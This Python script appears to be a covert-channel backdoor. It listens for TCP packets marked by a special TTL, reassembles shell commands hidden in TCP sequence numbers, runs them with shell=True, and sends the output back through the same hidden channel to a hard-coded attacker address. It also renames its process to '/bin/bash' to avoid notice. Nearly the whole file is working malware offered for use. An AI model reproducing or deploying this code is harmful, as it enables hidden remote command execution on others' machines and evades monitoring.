#!/usr/bin/python3

import uuid #Used to generate UID's
import optparse
import os
import subprocess
import sys
import time
from bkutil import message_to_bits
from multiprocessing import Process
from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *
import _thread
import setproctitle

"""
Setup: pip3 install pycrypto setproctitle scapy
"""

TTL=234
TTLKEY=222
# random secret key (both the client and server must match this key)
encryptionKey = "passyourwordssss"
iv = Random.new().read(AES.block_size)
IV = "whatsthedealwith"
victim=("192.168.0.10",9999)
messages = []
authentication ="1337"
setFlag = "E"

myip=("192.168.0.3",66)

def secret_send(msg:str, type:str='command'):
    '''
    Keyword arguments:
    msg      - payload being sent
    type     - file or command (default:command)
    '''
    if(type == "command"):
        #Convert message to ASCII to bits
        msg = message_to_bits(msg)
        chunks = message_spliter(msg)
        packets = packatizer(chunks)
        if(len(packets) == 1):
            send(packets[0])
        else:
            for packet in packets:
                send(packet)
                pass

def message_spliter(msg:str):
    length = 32 #bits in seq #
    if(len(msg) == length ):
        output = []
        output.append(msg)
        return msg
    elif(len(msg) <= length):
        # Pad so that the message is as long as the length
        msg = msg.zfill(length)
        return msg
    #If the message length is greater than what can be stuffed into one packet,
    #then break it down into multiple chunks
    elif(len(msg) > length):
        #Rounds are the amount of packets that can be filled with the data.
        rounds = int(len(msg) / length)
        #The excess is what will be left over
        excess = len(msg) % length
        #Create the blank array that will hold the data for each packet.
        output = []
        #Markers that will be used for traversing the data.
        i = 0
        start = 0
        end = 0
        # While packets can be completely filled
        while(i < rounds):
            start = i*length
            end = (i*length)+(length - 1) #31
            output.append(msg[start:end+1])
            i = i + 1
        #All the full packets have been created. Now to deal with the excess
        if(excess > 0):
            #Add the excess to the output array.
            output.append(msg[(end+1):(end+1+excess)])
        return output

def packatizer(msg):
    #Create the packets array as a placeholder.
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = str(uuid.uuid1())

    #If not an array (if there is only one packet.)
    if(type(msg) is str):
        #The transmissions position and total will be 1.
        # i.e. 1/1 message to send.
        packets.append(craft(msg,counter+1,1,UID))
    #If an array (if there is more than one packet)
    elif(type(msg) is list):
        while (counter < len(msg)):
            #The position will be the array element and the total will be the
            # length.
            # i.e. 1/3 messages to send.
            packets.append(craft(msg[counter],counter+1,len(msg),UID))
            counter = counter + 1
    packets.append(IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], flags="U"))
    return packets

def craft(data:str,position:int,total:int,UID:str) -> IP:
    global TTL
    global authentication
    global setFlag
    #The payload contains the unique password, UID, position number and total.
    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
        seq=int(str(data),2), flags=setFlag)
    return packet

def encrypt(message: str) -> str:
    global encryptionKey
    global IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(message)
    #return message

def decrypt(command: str) -> str:
    global encryptionKey
    global IV
    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

def execPayload(command):
	#Execute the command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read()  + proc.stderr.read()
    payload = str(result)
    #print (payload)
    secret_send(payload)

def text_from_bits(bits, encoding='utf-8', errors='surrogatepass'):
    n = int(bits, 2)
    return n.to_bytes((n.bit_length() + 7) // 8, 'big').decode(encoding, errors) or '\0'

def commandResult(packet):
    global ttlKey
    global args
    global cipher
    global messages
    srcIP = packet[IP].src
    ttl = packet[IP].ttl
    if(packet.haslayer(IP)):
        if(authenticate(packet)):
            #  we used ord in the client to convert the string character into a Unicoded value
            #  chr() now encodes the Unicoded value back as a string literal
            #  the message is stored in the sequence number field of the TCP header
            # checks if the flag has been set to know it contains the secret results
            flag = packet['TCP'].flags
            #  the client set an "Echo" flag to make sure the receiver knows it's truly them
            if flag == 0x40:
                field = packet[TCP].seq
                #print (lengthChecker(field)
                #Converts the bits to the nearest divisible by 8
                covertContent = lengthChecker(field)
                #print(text_from_bits(covertContent))
                messages.append(text_from_bits(covertContent))
            #End Flag detected
            elif flag == 0x20:
                payload=''.join(messages)
                execPayload(payload)
                messages = []
    else:
        return


def lengthChecker(field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if len(seqContent) < 8:
        covertContent = bin(field)[2:].zfill(8)
    elif len(seqContent) > 8 and len(seqContent) < 16:
        covertContent = bin(field)[2:].zfill(16)
    elif len(seqContent) > 16 and len(seqContent) < 24:
        covertContent = bin(field)[2:].zfill(24)
    elif len(seqContent) > 24 and len(seqContent) < 32:
        covertContent = bin(field)[2:].zfill(32)
    else:
        return seqContent
    return covertContent

def authenticate(packet):
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == TTLKEY:
        return True
    return False

def commandSniffer(threadName, infectedIP):
    sniff(filter="tcp and host "+infectedIP, prn=commandResult)


setproctitle.setproctitle("/bin/bash") #set fake process name
#print(setproctitle.getproctitle())

'''
try:
   _thread.start_new_thread( commandSniffer, ("commandSniffer",victim[0]) )
except Exception as e:
    print (str(e))
'''
commandSniffer("CommandSniffer",victim[0])
